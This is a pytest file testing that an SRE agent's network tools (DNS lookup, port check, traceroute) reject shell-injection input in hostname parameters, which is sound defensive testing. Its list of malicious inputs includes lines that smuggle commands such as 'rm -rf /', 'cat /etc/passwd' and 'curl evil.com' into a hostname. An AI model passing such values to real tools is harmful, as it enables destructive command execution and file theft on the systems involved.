"""Integration tests for network toolset param_validators and YAML loading."""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from sre_agent.core.tool import ToolResultStatus
from sre_agent.core.toolset_manager import ToolsetManager


NETWORK_YAML = Path(__file__).resolve().parent.parent / "src" / "sre_agent" / "toolsets" / "network.yaml"


@pytest.fixture
def network_tools():
    # 直接走生产 YAML 解析路径，确保测试覆盖声明内容到 YAMLTool 的真实映射。
    with open(NETWORK_YAML, encoding="utf-8") as f:
        data = yaml.safe_load(f)
    manager = ToolsetManager()
    tools = manager._parse_tools(data.get("tools", []))
    return {t.name: t for t in tools}


# 恶意输入集合覆盖命令分隔、管道、命令替换、换行和后台执行等 shell 注入入口。
class TestParamValidatorsRejectInjection:
    MALICIOUS_INPUTS = [
        "example.com; rm -rf /",
        "host | cat /etc/passwd",
        "$(whoami).evil.com",
        "`id`.attacker.com",
        "host & curl evil.com",
        "10.0.0.1; echo pwned",
        "host\nnewline",
        "legit.com$(curl evil)",
    ]

    @pytest.mark.parametrize("bad_input", MALICIOUS_INPUTS)
    def test_dns_lookup_rejects_injection(self, network_tools, bad_input):
        tool = network_tools["dns_lookup"]
        result = tool._invoke({"domain": bad_input})
        assert result.status == ToolResultStatus.ERROR
        assert "invalid characters" in result.error

    @pytest.mark.parametrize("bad_input", MALICIOUS_INPUTS)
    def test_port_check_rejects_injection(self, network_tools, bad_input):
        tool = network_tools["port_check"]
        result = tool._invoke({"host": bad_input, "port": "8080"})
        assert result.status == ToolResultStatus.ERROR
        assert "invalid characters" in result.error

    @pytest.mark.parametrize("bad_input", MALICIOUS_INPUTS)
    def test_traceroute_rejects_injection(self, network_tools, bad_input):
        tool = network_tools["traceroute"]
        result = tool._invoke({"host": bad_input})
        assert result.status == ToolResultStatus.ERROR
        assert "invalid characters" in result.error


# 正向集合覆盖域名、IPv4、IPv6、localhost 和带连字符主机名，防止规则过严。
class TestParamValidatorsAcceptValid:
    VALID_INPUTS = [
        "api.prod.internal",
        "10.0.1.50",
        "my-host.example.com",
        "2001:db8::1",
        "localhost",
        "a.b.c.d.e.f",
        "host-with-dashes.io",
    ]

    @pytest.mark.parametrize("good_input", VALID_INPUTS)
    def test_dns_lookup_accepts_valid(self, network_tools, good_input):
        tool = network_tools["dns_lookup"]
        result = tool._invoke({"domain": good_input})
        # Should not fail validation (may fail execution since dig might not be available)
        assert result.status != ToolResultStatus.ERROR or "invalid characters" not in (result.error or "")

    @pytest.mark.parametrize("good_input", VALID_INPUTS)
    def test_port_check_accepts_valid(self, network_tools, good_input):
        tool = network_tools["port_check"]
        result = tool._invoke({"host": good_input, "port": "443"})
        assert result.status != ToolResultStatus.ERROR or "invalid characters" not in (result.error or "")


# 装载测试固定工具数量/名称，并确认所有接收主机参数的工具声明了 validator。
class TestNetworkYAMLLoading:
    def test_all_tools_loaded(self, network_tools):
        assert "dns_lookup" in network_tools
        assert "port_check" in network_tools
        assert "http_check" in network_tools
        assert "traceroute" in network_tools

    def test_tools_have_validators(self, network_tools):
        assert network_tools["dns_lookup"]._param_validators == {"domain": "hostname"}
        assert network_tools["port_check"]._param_validators == {"host": "hostname"}
        assert network_tools["http_check"]._param_validators == {"url": "hostname"}
        assert network_tools["traceroute"]._param_validators == {"host": "hostname"}
